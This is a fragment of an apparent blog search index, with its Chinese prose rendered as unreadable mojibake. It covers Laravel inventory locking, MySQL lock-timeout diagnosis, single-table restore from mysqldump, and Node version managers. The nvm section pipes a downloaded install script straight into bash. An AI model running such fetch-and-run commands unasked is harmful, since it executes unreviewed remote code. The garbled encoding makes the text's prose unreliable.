$redis-&gt;rawCommand('incrby', 'product_' . $id, 1); return \"å–å®Œå•¦ï¼\"; &#125; return 'success';&#125; åº“å­˜æ­£å¸¸ã€‚ Redis åŸå­é”12345678910111213141516171819202122public function test()&#123; $id = request()-&gt;input('id'); $lock = \\Cache::lock(\"product_\" . $id, 10); try &#123; //æœ€å¤šç­‰å¾…5ç§’ï¼Œ5ç§’åæœªè·å–åˆ°é”ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ $lock-&gt;block(5); $product = TbModel::where('id', $id)-&gt;firstOrFail(); if ($product-&gt;num &lt;= 0) &#123; return \"å–å…‰å•¦ï¼ï¼\"; &#125; $product-&gt;decrement('num'); return 'success'; &#125;catch (LockTimeoutException $e) &#123; return 'å½“å‰äººæ•°è¿‡å¤š'; &#125; finally &#123; optional($lock)-&gt;release(); &#125;&#125; åº“å­˜æ­£å¸¸ã€‚ Mysql æ‚²è§‚é”12345678910111213141516171819public function test()&#123; $id = request()-&gt;input('id'); try &#123; \\DB::beginTransaction(); $product = Product::where('id', $id)-&gt;lockForUpdate()-&gt;first(); if ($product-&gt;num &lt;= 0) &#123; return \"å–å…‰å•¦ï¼ï¼\"; &#125; $product-&gt;decrement('num'); \\DB::commit(); return \"success\"; &#125; catch (\\Exception $exception) &#123; return \"error\"; &#125;&#125; åº“å­˜æ­£å¸¸ã€‚ Mysql ä¹è§‚é”12345678910111213141516public function test()&#123; $id = request()-&gt;input('id'); $product = TbModel::where('id', $id)-&gt;first(); if ($product-&gt;num &lt;= 0) &#123; return \"å–å…‰å•¦ï¼ï¼\"; &#125; //ä¿®æ”¹å‰æ£€æŸ¥åº“å­˜å’Œä¹‹å‰æ˜¯å¦ä¸€è‡´ï¼Œä¸ä¸€è‡´è¯´æ˜å·²ç»æœ‰å˜åŠ¨ï¼Œåˆ™æ”¾å¼ƒæ›´æ”¹ $res = \\DB::update('UPDATE `tb` SET num = num -1 WHERE id = ? AND num=?', [$id, $product-&gt;num]); if (!$res) &#123; return 'å½“å‰äººæ•°è¿‡å¤š'; &#125; return 'success';&#125; åº“å­˜æ­£å¸¸ã€‚ ä¼˜åŒ–ä¹è§‚é”ï¼Œä¿®æ”¹åº“å­˜çš„ sql ä¿®æ”¹ä¸ºï¼š 1\\DB::update('UPDATE `tb` SET num = num -1 WHERE id = ? AND num-1 &gt;= 0', [$id]); æ€»ç»“ä»¥ä¸Šå‡ ç§æ–¹æ¡ˆéƒ½å¯ä»¥æœ‰æ•ˆè§£å†³åº“å­˜è¶…å‡ºçš„é—®é¢˜ï¼Œåº”ç”¨æ—¶å¯ä»¥æ ¹æ®å®é™…å…·ä½“åœºæ™¯è¿›è¡Œé€‰æ‹©ï¼Œä¼˜å…ˆè€ƒè™‘é¡ºåºä¸ºï¼šRedis å­˜å‚¨ &gt; Redis åŸå­é” &gt; Mysql æ‚²è§‚é”/ä¹è§‚é” å‚è€ƒé“¾æ¥ ä½¿ç”¨laravelè§£å†³åº“å­˜è¶…å‡ºçš„å‡ ä¸ªæ–¹æ¡ˆ","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"}]},{"title":"MySql Lock wait timeout exceeded å¼‚å¸¸è®°å½•","slug":"mysql-lock-wait-timeout-exceeded-exception-record","date":"2022-04-11T13:04:58.000Z","updated":"2022-05-24T02:20:27.784Z","comments":true,"path":"mysql-lock-wait-timeout-exceeded-exception-record/","link":"","permalink":"https://www.0x2beace.com/mysql-lock-wait-timeout-exceeded-exception-record/","excerpt":"åŸæ–‡é“¾æ¥ï¼šMySql Lock wait timeout exceededè¯¥å¦‚ä½•å¤„ç†ï¼Ÿ Mysqlé€ æˆé”çš„æƒ…å†µæœ‰å¾ˆå¤šï¼Œä¸‹é¢æˆ‘ä»¬å°±åˆ—ä¸¾ä¸€äº›æƒ…å†µï¼š æ‰§è¡Œ DML æ“ä½œæ²¡æœ‰ Commitï¼Œå†æ‰§è¡Œåˆ é™¤æ“ä½œå°±ä¼šé”è¡¨ã€‚ åœ¨åŒä¸€äº‹åŠ¡å†…å…ˆåå¯¹åŒä¸€æ¡æ•°æ®è¿›è¡Œæ’å…¥å’Œæ›´æ–°æ“ä½œã€‚ è¡¨ç´¢å¼•è®¾è®¡ä¸å½“ï¼Œå¯¼è‡´æ•°æ®åº“å‡ºç°æ­»é”ã€‚ é•¿äº‹ç‰©ï¼Œé˜»å¡ DDLï¼Œç»§è€Œé˜»å¡æ‰€æœ‰åŒè¡¨çš„åç»­æ“ä½œã€‚","text":"åŸæ–‡é“¾æ¥ï¼šMySql Lock wait timeout exceededè¯¥å¦‚ä½•å¤„ç†ï¼Ÿ Mysqlé€ æˆé”çš„æƒ…å†µæœ‰å¾ˆå¤šï¼Œä¸‹é¢æˆ‘ä»¬å°±åˆ—ä¸¾ä¸€äº›æƒ…å†µï¼š æ‰§è¡Œ DML æ“ä½œæ²¡æœ‰ Commitï¼Œå†æ‰§è¡Œåˆ é™¤æ“ä½œå°±ä¼šé”è¡¨ã€‚ åœ¨åŒä¸€äº‹åŠ¡å†…å…ˆåå¯¹åŒä¸€æ¡æ•°æ®è¿›è¡Œæ’å…¥å’Œæ›´æ–°æ“ä½œã€‚ è¡¨ç´¢å¼•è®¾è®¡ä¸å½“ï¼Œå¯¼è‡´æ•°æ®åº“å‡ºç°æ­»é”ã€‚ é•¿äº‹ç‰©ï¼Œé˜»å¡ DDLï¼Œç»§è€Œé˜»å¡æ‰€æœ‰åŒè¡¨çš„åç»­æ“ä½œã€‚ ä½†æ˜¯è¦åŒºåˆ†çš„æ˜¯ Lock wait timeout exceeded ä¸ Dead Lock æ˜¯ä¸ä¸€æ ·ã€‚ Lock wait timeout exceededï¼šåæäº¤çš„äº‹åŠ¡ç­‰å¾…å‰é¢å¤„ç†çš„äº‹åŠ¡é‡Šæ”¾é”ï¼Œä½†æ˜¯åœ¨ç­‰å¾…çš„æ—¶å€™è¶…è¿‡äº†mysqlçš„é”ç­‰å¾…æ—¶é—´ï¼Œå°±ä¼šå¼•å‘è¿™ä¸ªå¼‚å¸¸ã€‚ Dead Lockï¼šä¸¤ä¸ªäº‹åŠ¡äº’ç›¸ç­‰å¾…å¯¹æ–¹é‡Šæ”¾ç›¸åŒèµ„æºçš„é”ï¼Œä»è€Œé€ æˆçš„æ­»å¾ªç¯ï¼Œå°±ä¼šå¼•å‘è¿™ä¸ªå¼‚å¸¸ã€‚ è¿˜æœ‰ä¸€ä¸ªè¦æ³¨æ„çš„æ˜¯ innodb_lock_wait_timeout ä¸ lock_wait_timeoutä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ã€‚ innodb_lock_wait_timeoutï¼šinnodb çš„ DML æ“ä½œçš„è¡Œçº§é”çš„ç­‰å¾…æ—¶é—´ lock_wait_timeoutï¼šæ•°æ®ç»“æ„ DDL æ“ä½œçš„é”çš„ç­‰å¾…æ—¶é—´ å¦‚ä½•æŸ¥çœ‹ innodb_lock_wait_timeout çš„å…·ä½“å€¼ï¼Ÿ 1SHOW VARIABLES LIKE &#39;innodb_lock_wait_timeout&#39; å‚æ•°ä¿®æ”¹çš„èŒƒå›´æœ‰Sessionå’ŒGlobalï¼Œå¹¶ä¸”æ”¯æŒåŠ¨æ€ä¿®æ”¹ï¼Œå¯ä»¥æœ‰ä¸¤ç§æ–¹æ³•ä¿®æ”¹ï¼š æ–¹æ³•ä¸€ï¼š é€šè¿‡ä¸‹é¢è¯­å¥ä¿®æ”¹ 12set innodb_lock_wait_timeout&#x3D;100;set global innodb_lock_wait_timeout&#x3D;100; æ³¨æ„ global çš„ä¿®æ”¹å¯¹å½“å‰çº¿ç¨‹æ˜¯ä¸ç”Ÿæ•ˆçš„ï¼Œåªæœ‰å»ºç«‹æ–°çš„è¿æ¥æ‰ç”Ÿæ•ˆã€‚ æ–¹æ³•äºŒï¼š ä¿®æ”¹å‚æ•°æ–‡ä»¶ /etc/my.cnf: 1innodb_lock_wait_timeout &#x3D; 50 innodb_lock_wait_timeout æŒ‡çš„æ˜¯äº‹åŠ¡ç­‰å¾…è·å–èµ„æºç­‰å¾…çš„æœ€é•¿æ—¶é—´ï¼Œè¶…è¿‡è¿™ä¸ªæ—¶é—´è¿˜æœªåˆ†é…åˆ°èµ„æºåˆ™ä¼šè¿”å›åº”ç”¨å¤±è´¥ï¼› å½“é”ç­‰å¾…è¶…è¿‡è®¾ç½®æ—¶é—´çš„æ—¶å€™ï¼Œå°±ä¼šæŠ¥å¦‚ä¸‹çš„é”™è¯¯ï¼›ERROR 1205 (HY000): Lock wait timeout exceeded; try restarting transactionã€‚å…¶å‚æ•°çš„æ—¶é—´å•ä½æ˜¯ç§’ï¼Œæœ€å°å¯è®¾ç½®ä¸º1s(ä¸€èˆ¬ä¸ä¼šè®¾ç½®å¾—è¿™ä¹ˆå°)ï¼Œæœ€å¤§å¯è®¾ç½®1073741824ç§’ï¼Œé»˜è®¤å®‰è£…æ—¶è¿™ä¸ªå€¼æ˜¯50s(é»˜è®¤å‚æ•°è®¾ç½®) é—®é¢˜å¯¼è‡´çš„ç»“æœ æ•°æ®æ›´æ–°æˆ–æ–°å¢åæ•°æ®ä¼šè‡ªåŠ¨å›æ»š è¡¨æ“ä½œè¿”å› Lock wait timeout exceeded å¹¶é•¿æ—¶é—´æ— ååº” è§£å†³æ–¹æ³• åº”æ€¥æ–¹æ³•ï¼šshow full processlist; killæ‰å‡ºç°é—®é¢˜çš„è¿›ç¨‹ã€‚ ps.æœ‰çš„æ—¶å€™é€šè¿‡processlistæ˜¯çœ‹ä¸å‡ºå“ªé‡Œæœ‰é”ç­‰å¾…çš„ï¼Œå½“ä¸¤ä¸ªäº‹åŠ¡éƒ½åœ¨commité˜¶æ®µæ˜¯æ— æ³•ä½“ç°åœ¨processlistä¸Š æ ¹æ²»æ–¹æ³•ï¼šselect * from innodb_trx; æŸ¥çœ‹æœ‰æ˜¯å“ªäº›äº‹åŠ¡å æ®äº†è¡¨èµ„æºã€‚ ps.é€šè¿‡è¿™ä¸ªåŠæ³•å°±éœ€è¦å¯¹innodbæœ‰ä¸€äº›äº†è§£æ‰å¥½å¤„ç† è¯´èµ·æ¥å¾ˆç®€å•æ‰¾åˆ°å®ƒæ€æ‰å®ƒå°±æå®šäº†ï¼Œä½†æ˜¯å®é™…ä¸Šå¹¶æ²¡æœ‰æƒ³è±¡çš„è¿™ä¹ˆç®€å•ï¼Œå½“é—®é¢˜å‡ºç°è¦åˆ†æé—®é¢˜çš„åŸå› ï¼Œé€šè¿‡åŸå› å®šä½ä¸šåŠ¡ä»£ç å¯èƒ½æŸäº›åœ°æ–¹å®ç°çš„æœ‰é—®é¢˜ï¼Œä»è€Œæ¥é¿å…ä»Šåé‡åˆ°åŒæ ·çš„é—®é¢˜ã€‚ innodb_*è¡¨çš„è§£é‡ŠMysqlçš„ InnoDB å­˜å‚¨å¼•æ“æ˜¯æ”¯æŒäº‹åŠ¡çš„ï¼Œäº‹åŠ¡å¼€å¯åæ²¡æœ‰è¢«ä¸»åŠ¨Commitã€‚å¯¼è‡´è¯¥èµ„æºè¢«é•¿æœŸå ç”¨ï¼Œå…¶ä»–äº‹åŠ¡åœ¨æŠ¢å è¯¥èµ„æºæ—¶ï¼Œå› ä¸Šä¸€ä¸ªäº‹åŠ¡çš„é”è€Œå¯¼è‡´æŠ¢å å¤±è´¥ï¼å› æ­¤å‡ºç° Lock wait timeout exceeded ä¸‹é¢å‡ å¼ è¡¨æ˜¯innodbçš„äº‹åŠ¡å’Œé”çš„ä¿¡æ¯è¡¨ï¼Œç†è§£è¿™äº›è¡¨å°±èƒ½å¾ˆå¥½çš„å®šä½é—®é¢˜ã€‚ innodb_trxï¼šå½“å‰è¿è¡Œçš„æ‰€æœ‰äº‹åŠ¡ innodb_locksï¼šå½“å‰å‡ºç°çš„é” innodb_lock_waitsï¼šé”ç­‰å¾…çš„å¯¹åº”å…³ç³» innodb_trx è¡¨ï¼š 123456789101112131415161718192021222324desc information_schema.innodb_trx;trx_idï¼šäº‹åŠ¡IDã€‚trx_stateï¼šäº‹åŠ¡çŠ¶æ€ï¼Œæœ‰ä»¥ä¸‹å‡ ç§çŠ¶æ€ï¼šRUNNINGã€LOCK WAITã€ROLLING BACK å’Œ COMMITTINGã€‚trx_startedï¼šäº‹åŠ¡å¼€å§‹æ—¶é—´ã€‚trx_requested_lock_idï¼šäº‹åŠ¡å½“å‰æ­£åœ¨ç­‰å¾…é”çš„æ ‡è¯†ï¼Œå¯ä»¥å’Œ INNODB_LOCKS è¡¨ JOIN ä»¥å¾—åˆ°æ›´å¤šè¯¦ç»†ä¿¡æ¯ã€‚trx_wait_startedï¼šäº‹åŠ¡å¼€å§‹ç­‰å¾…çš„æ—¶é—´ã€‚trx_weightï¼šäº‹åŠ¡çš„æƒé‡ã€‚trx_mysql_thread_idï¼šäº‹åŠ¡çº¿ç¨‹ IDï¼Œå¯ä»¥å’Œ PROCESSLIST è¡¨ JOINã€‚trx_queryï¼šäº‹åŠ¡æ­£åœ¨æ‰§è¡Œçš„ SQL è¯­å¥ã€‚trx_operation_stateï¼šäº‹åŠ¡å½“å‰æ“ä½œçŠ¶æ€ã€‚trx_tables_in_useï¼šå½“å‰äº‹åŠ¡æ‰§è¡Œçš„ SQL ä¸­ä½¿ç”¨çš„è¡¨çš„ä¸ªæ•°ã€‚trx_tables_lockedï¼šå½“å‰æ‰§è¡Œ SQL çš„è¡Œé”æ•°é‡ã€‚trx_lock_structsï¼šäº‹åŠ¡ä¿ç•™çš„é”æ•°é‡ã€‚trx_lock_memory_bytesï¼šäº‹åŠ¡é”ä½çš„å†…å­˜å¤§å°ï¼Œå•ä½ä¸º BYTESã€‚trx_rows_lockedï¼šäº‹åŠ¡é”ä½çš„è®°å½•æ•°ã€‚åŒ…å«æ ‡è®°ä¸º DELETEDï¼Œå¹¶ä¸”å·²ç»ä¿å­˜åˆ°ç£ç›˜ä½†å¯¹äº‹åŠ¡ä¸å¯è§çš„è¡Œã€‚trx_rows_modifiedï¼šäº‹åŠ¡æ›´æ”¹çš„è¡Œæ•°ã€‚trx_concurrency_ticketsï¼šäº‹åŠ¡å¹¶å‘ç¥¨æ•°ã€‚trx_isolation_levelï¼šå½“å‰äº‹åŠ¡çš„éš”ç¦»çº§åˆ«ã€‚trx_unique_checksï¼šæ˜¯å¦æ‰“å¼€å”¯ä¸€æ€§æ£€æŸ¥çš„æ ‡è¯†ã€‚trx_foreign_key_checksï¼šæ˜¯å¦æ‰“å¼€å¤–é”®æ£€æŸ¥çš„æ ‡è¯†ã€‚trx_last_foreign_key_errorï¼šæœ€åä¸€æ¬¡çš„å¤–é”®é”™è¯¯ä¿¡æ¯ã€‚trx_adaptive_hash_latchedï¼šè‡ªé€‚åº”æ•£åˆ—ç´¢å¼•æ˜¯å¦è¢«å½“å‰äº‹åŠ¡é”ä½çš„æ ‡è¯†ã€‚trx_adaptive_hash_timeoutï¼šæ˜¯å¦ç«‹åˆ»æ”¾å¼ƒä¸ºè‡ªé€‚åº”æ•£åˆ—ç´¢å¼•æœç´¢ LATCH çš„æ ‡è¯†ã€‚ innodb_locks è¡¨ï¼š 123456789101112desc information_schema.innodb_locks;lock_idï¼šé” IDã€‚lock_trx_idï¼šæ‹¥æœ‰é”çš„äº‹åŠ¡ IDã€‚å¯ä»¥å’Œ INNODB_TRX è¡¨ JOIN å¾—åˆ°äº‹åŠ¡çš„è¯¦ç»†ä¿¡æ¯ã€‚lock_modeï¼šé”çš„æ¨¡å¼ã€‚æœ‰å¦‚ä¸‹é”ç±»å‹ï¼šè¡Œçº§é”åŒ…æ‹¬ï¼šSã€Xã€ISã€IXï¼Œåˆ†åˆ«ä»£è¡¨ï¼šå…±äº«é”ã€æ’å®ƒé”ã€æ„å‘å…±äº«é”ã€æ„å‘æ’å®ƒé”ã€‚è¡¨çº§é”åŒ…æ‹¬ï¼šS_GAPã€X_GAPã€IS_GAPã€IX_GAP å’Œ AUTO_INCï¼Œåˆ†åˆ«ä»£è¡¨å…±äº«é—´éš™é”ã€æ’å®ƒé—´éš™é”ã€æ„å‘å…±äº«é—´éš™é”ã€æ„å‘æ’å®ƒé—´éš™é”å’Œè‡ªåŠ¨é€’å¢é”ã€‚lock_typeï¼šé”çš„ç±»å‹ã€‚RECORD ä»£è¡¨è¡Œçº§é”ï¼ŒTABLE ä»£è¡¨è¡¨çº§é”ã€‚lock_tableï¼šè¢«é”å®šçš„æˆ–è€…åŒ…å«é”å®šè®°å½•çš„è¡¨çš„åç§°ã€‚lock_indexï¼šå½“ LOCK_TYPE&#x3D;â€™RECORDâ€™ æ—¶ï¼Œè¡¨ç¤ºç´¢å¼•çš„åç§°ï¼›å¦åˆ™ä¸º NULLã€‚lock_spaceï¼šå½“ LOCK_TYPE&#x3D;â€™RECORDâ€™ æ—¶ï¼Œè¡¨ç¤ºé”å®šè¡Œçš„è¡¨ç©ºé—´ IDï¼›å¦åˆ™ä¸º NULLã€‚lock_pageï¼šå½“ LOCK_TYPE&#x3D;â€™RECORDâ€™ æ—¶ï¼Œè¡¨ç¤ºé”å®šè¡Œçš„é¡µå·ï¼›å¦åˆ™ä¸º NULLã€‚lock_recï¼šå½“ LOCK_TYPE&#x3D;â€™RECORDâ€™ æ—¶ï¼Œè¡¨ç¤ºä¸€å †é¡µé¢ä¸­é”å®šè¡Œçš„æ•°é‡ï¼Œäº¦å³è¢«é”å®šçš„è®°å½•å·ï¼›å¦åˆ™ä¸º NULLã€‚lock_dataï¼šå½“ LOCK_TYPE&#x3D;â€™RECORDâ€™ æ—¶ï¼Œè¡¨ç¤ºé”å®šè¡Œçš„ä¸»é”®ï¼›å¦åˆ™ä¸ºNULLã€‚ innodb_lock_waits è¡¨ï¼š 123456desc information_schema.innodb_lock_waits;requesting_trx_idï¼šè¯·æ±‚äº‹åŠ¡çš„ IDã€‚requested_lock_idï¼šäº‹åŠ¡æ‰€ç­‰å¾…çš„é”å®šçš„ IDã€‚å¯ä»¥å’Œ INNODB_LOCKS è¡¨ JOINã€‚blocking_trx_idï¼šé˜»å¡äº‹åŠ¡çš„ IDã€‚blocking_lock_idï¼šæŸä¸€äº‹åŠ¡çš„é”çš„ IDï¼Œè¯¥äº‹åŠ¡é˜»å¡äº†å¦ä¸€äº‹åŠ¡çš„è¿è¡Œã€‚å¯ä»¥å’Œ INNODB_LOCKS è¡¨ JOINã€‚ é”ç­‰å¾…çš„å¤„ç†æ­¥éª¤æŸ¥çœ‹ innodb_lock_waits è¡¨ 1SELECT * FROM innodb_lock_waits; innodb_locks è¡¨å’Œ innodb_lock_waits è¡¨è”è¡¨æŸ¥çœ‹ï¼š 1SELECT * FROM innodb_locks WHERE lock_trx_id IN (SELECT blocking_trx_id FROM innodb_lock_waits); innodb_locks è¡¨ JOIN innodb_lock_waits è¡¨è”è¡¨æŸ¥çœ‹ï¼š 1SELECT innodb_locks.* FROM innodb_locks JOIN innodb_lock_waits ON (innodb_locks.lock_trx_id &#x3D; innodb_lock_waits.blocking_trx_id); æŸ¥è¯¢ innodb_trx è¡¨: 1SELECT trx_id, trx_requested_lock_id, trx_mysql_thread_id, trx_query FROM innodb_trx WHERE trx_state &#x3D; &#39;LOCK WAIT&#39;; trx_mysql_thread_id å³ kill æ‰äº‹åŠ¡çº¿ç¨‹ ID 12SHOW ENGINE INNODB STATUS ;SHOW PROCESSLIST ; ä»ä¸Šè¿°æ–¹æ³•ä¸­å¾—åˆ°äº†ç›¸å…³ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°å‘ç”Ÿé”ç­‰å¾…çš„çº¿ç¨‹ IDï¼Œç„¶åå°†å…¶ KILL æ‰ã€‚ KILL æ‰å‘ç”Ÿé”ç­‰å¾…çš„çº¿ç¨‹ã€‚ 1kill ID; å‰å‡ å¤©ç”Ÿæˆç¯å¢ƒï¼Œæœ‰ä¸ªéœ€æ±‚éœ€è¦è·‘ä¸ªè„šæœ¬å¤„ç†ä¸€ä¸‹ã€‚è„šæœ¬æ‰€åšçš„äº‹æƒ…æ˜¯éå†æŸ¥è¯¢å‡ºæ¥çš„æ•°æ®é›†ï¼Œé€ä¸ªè°ƒç”¨æŸæ®µé€»è¾‘ã€‚ ç»“æœç­‰äº†åŠå¤©ï¼Œå‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰ä¿®æ”¹æˆåŠŸã€‚ åé¢æŸ¥çœ‹æ—¥å¿—æ‰å‘ç°æ˜¯å› ä¸ºæŸæ¬¡æŠ›å‡ºå¼‚å¸¸æ—¶ï¼Œäº‹åŠ¡æ²¡æœ‰é‡Šæ”¾ï¼Œ è€Œåæäº¤çš„äº‹åŠ¡åˆéœ€è¦ç­‰å¾…å‰é¢å¤„ç†çš„äº‹åŠ¡é‡Šæ”¾é”ï¼Œä½†æ˜¯ç­‰å¾…çš„æ—¶é—´è¶…è¿‡äº† Mysql innodb_lock_wait_timeout æ‰€è®¾ç½®çš„è¶…æ—¶æ—¶é—´ï¼Œæ‰€ä»¥å¼•å‘äº† Lock wait timeout exceeded å¼‚å¸¸ï¼Œäº‹åŠ¡è‡ªåŠ¨å›æ»šäº†ï¼Œä¹Ÿå°±å‡ºç°äº†æ•°æ®éƒ½æ²¡æœ‰å˜åŒ–çš„ç°è±¡ã€‚ å‚è€ƒé“¾æ¥ MySql Lock wait timeout exceededè¯¥å¦‚ä½•å¤„ç†ï¼Ÿ å…³äºMySQLçš„lock wait timeout exceededè§£å†³æ–¹æ¡ˆ","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Mysql å¦‚ä½•ä»å…¨å¤‡ä¸­æ¢å¤æŒ‡å®šè¡¨æ•°æ®","slug":"how-mysql-restores-specified-table-data-from-full-backup","date":"2022-04-09T08:15:26.000Z","updated":"2022-05-24T02:20:27.782Z","comments":true,"path":"how-mysql-restores-specified-table-data-from-full-backup/","link":"","permalink":"https://www.0x2beace.com/how-mysql-restores-specified-table-data-from-full-backup/","excerpt":"å¤‡ä»½æ•°æ®åº“æ˜¯å¸¸æœ‰çš„éœ€æ±‚ï¼Œé€šå¸¸æ˜¯æ•´åº“å¤‡ä»½ï¼Œæ•´åº“è¿˜åŸã€‚ä½†å¦‚æœåªæƒ³è¿˜åŸå…¶ä¸­éƒ¨åˆ†æ•°æ®è¡¨ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ","text":"å¤‡ä»½æ•°æ®åº“æ˜¯å¸¸æœ‰çš„éœ€æ±‚ï¼Œé€šå¸¸æ˜¯æ•´åº“å¤‡ä»½ï¼Œæ•´åº“è¿˜åŸã€‚ä½†å¦‚æœåªæƒ³è¿˜åŸå…¶ä¸­éƒ¨åˆ†æ•°æ®è¡¨ï¼Œè¯¥æ€ä¹ˆåšå‘¢ï¼Ÿ æµ‹è¯•å‰å‡†å¤‡ mysqldump å¤‡ä»½æŒ‡å®šæ•°æ®åº“ï¼Œå¦‚ï¼štest_dump 1mysqldump -uroot -p mysql -F -R -E --triggers --databases test_dump | gzip &gt;dbtest_$(date +%F).sql.gz; ç¡®è®¤å¤‡ä»½æ–‡ä»¶å·²ç»ç”Ÿæˆ 123lldbtest_2022-04-09.sql.gz åˆ é™¤éœ€è¦è¿˜åŸçš„è¡¨ æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸­æ‰€æœ‰è¡¨ï¼š 12345678mysql&gt; show tables;+---------------------+| Tables_in_test_dump |+---------------------+| tb || tb2 |+---------------------+3 rows in set (0.00 sec) æŸ¥çœ‹éœ€è¦è¿˜åŸçš„è¡¨çš„æ•°æ®ï¼š 1234567891011121314mysql&gt; select * from tb2;+----+------+------+------+| id | name | val | memo |+----+------+------+------+| 1 | a | 2 | a2 || 2 | a | 1 | a1 || 3 | a | 3 | a3 || 5 | b | 3 | b3 || 6 | b | 2 | b2 || 7 | b | 4 | b4 || 8 | b | 5 | b5 || 9 | b | 1 | b1 |+----+------+------+------+8 rows in set (0.00 sec) åˆ é™¤ç›®æ ‡è¡¨ï¼š 12mysql&gt; drop table tb2;Query OK, 0 rows affected (0.01 sec) ä»å¤‡ä»½ä¸­æ¢å¤ ä»å¤‡ä»½æ–‡ä»¶ä¸­æ‰¾å‡ºéœ€è¦æ¢å¤çš„è¡¨çš„å»ºè¡¨è¯­å¥ï¼š 12345678910111213gunzip -c dbtest_2022-04-09.sql.gz | sed -e '/./&#123;H;$!d;&#125;' -e 'x;/CREATE TABLE `tb2`/!d;q';DROP TABLE IF EXISTS `tb222`;/*!40101 SET @saved_cs_client = @@character_set_client */;/*!40101 SET character_set_client = utf8 */;CREATE TABLE `tb222` ( `id` int(11) unsigned NOT NULL AUTO_INCREMENT, `name` varchar(10) DEFAULT NULL, `val` int(11) DEFAULT NULL, `memo` varchar(20) DEFAULT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;/*!40101 SET character_set_client = @saved_cs_client */; ä»å¤‡ä»½æ–‡ä»¶ä¸­æ‰¾å‡ºéœ€è¦æ¢å¤è¡¨çš„æ•°æ® 123gunzip -c dbtest_2022-04-09.sql.gz | sed -e '/./&#123;H;$!d;&#125;' -e 'x;/CREATE TABLE `tb2`/!d;q'INSERT INTO `tb222` VALUES (1,'a',2,'a2'),(2,'a',1,'a1'),(3,'a',3,'a3'),(5,'b',3,'b3'),(6,'b',2,'b2'),(7,'b',4,'b4'),(8,'b',5,'b5'),(9,'b',1,'b1'); ç¡®è®¤äº†æ•°æ®ä¹‹åæ— è¯¯ä¹‹åï¼Œå°±å¼€å§‹æ¢å¤äº†ã€‚ æ¢å¤è¢«åˆ é™¤è¡¨çš„è¡¨ç»“æ„ 1gunzip -c dbtest_2022-04-09.sql.gz | sed -e '/./&#123;H;$!d;&#125;' -e 'x;/CREATE TABLE `tb2`/!d;q' | mysql -uroot -p test_dump ä»å¤‡ä»½æ–‡ä»¶ä¸­æ¢å¤è¢«åˆ é™¤è¡¨çš„æ•°æ® 1gunzip -c dbtest_2022-04-09.sql.gz | grep --ignore-case 'insert into `tb2`'| mysql -uroot -p test_dump æŸ¥çœ‹ç›®æ ‡è¡¨ï¼Œæ•°æ®å·²ç»æ¢å¤ï¼š 1234567891011121314mysql&gt; select * from tb2;+----+------+------+------+| id | name | val | memo |+----+------+------+------+| 1 | a | 2 | a2 || 2 | a | 1 | a1 || 3 | a | 3 | a3 || 5 | b | 3 | b3 || 6 | b | 2 | b2 || 7 | b | 4 | b4 || 8 | b | 5 | b5 || 9 | b | 1 | b1 |+----+------+------+------+8 rows in set (0.00 sec) æ³¨æ„ï¼šå®é™…ä½¿ç”¨æ—¶ä»¥ä¸Šå‘½ä»¤ä¸­çš„éƒ¨åˆ†æ–‡ä»¶åæˆ–è¡¨åéœ€è¦æ›¿æ¢æˆä½ è‡ªå·±çš„ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Node ç‰ˆæœ¬æ§åˆ¶å·¥å…·","slug":"node-version-control-tool","date":"2022-04-05T02:47:51.000Z","updated":"2022-05-24T02:20:27.785Z","comments":true,"path":"node-version-control-tool/","link":"","permalink":"https://www.0x2beace.com/node-version-control-tool/","excerpt":"ä¸»æµçš„ Node.js ç‰ˆæœ¬ç®¡ç†å·¥å…·æœ‰ n å’Œ nvmï¼Œä¸¤è€…éƒ½æ˜¯ä½¿ç”¨ shell è„šæœ¬å®ç°ï¼Œæœ¬æ–‡ä¼šé€ä¸€ä»‹ç»ã€‚","text":"ä¸»æµçš„ Node.js ç‰ˆæœ¬ç®¡ç†å·¥å…·æœ‰ n å’Œ nvmï¼Œä¸¤è€…éƒ½æ˜¯ä½¿ç”¨ shell è„šæœ¬å®ç°ï¼Œæœ¬æ–‡ä¼šé€ä¸€ä»‹ç»ã€‚ nn æ˜¯Nodeçš„ä¸€ä¸ªæ¨¡å—ï¼Œä½œè€…æ˜¯TJ Holowaychukï¼ˆé¼é¼å¤§åçš„[Express]æ¡†æ¶ä½œè€…ï¼‰ï¼Œå°±åƒå®ƒçš„åå­—ä¸€æ ·ï¼Œå®ƒçš„ç†å¿µå°±æ˜¯ç®€å•ã€‚ å®‰è£…1sudo npm install -g n ç‰ˆæœ¬åˆ‡æ¢1n x.x.x å®‰è£…æŸä¸ªç‰ˆæœ¬1n x.x.x å®‰è£…æœ€æ–°ç‰ˆæœ¬1n latest å®‰è£…ç¨³å®šç‰ˆæœ¬1n stable åˆ é™¤æŸä¸ªç‰ˆæœ¬1n rm x.x.x æŒ‡å®šæŸä¸ªç‰ˆæœ¬æ¥æ‰§è¡Œæ–‡ä»¶1n user x.x.x some.js nvmnvm å…¨ç§°Node Version Managerã€‚ å®‰è£…nvm é¡¹ç›®æä¾›äº†ä¸€ä¸ª install.sh è„šæœ¬å¸®åŠ©ç”¨æˆ·å¿«é€Ÿå®‰è£…ï¼Œå¯ä»¥ä½¿ç”¨ cURL æˆ– Wget ç­‰å·¥å…·ä¸‹è½½ã€‚ 1curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash æˆ–è€… 1wget -qO- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.1/install.sh | bash è¿è¡Œä¸Šé¢å‘½ä»¤ä¸­çš„ä»»æ„ä¸€æ¡ï¼Œå°±ä¼šä¸‹è½½å¹¶è¿è¡Œ 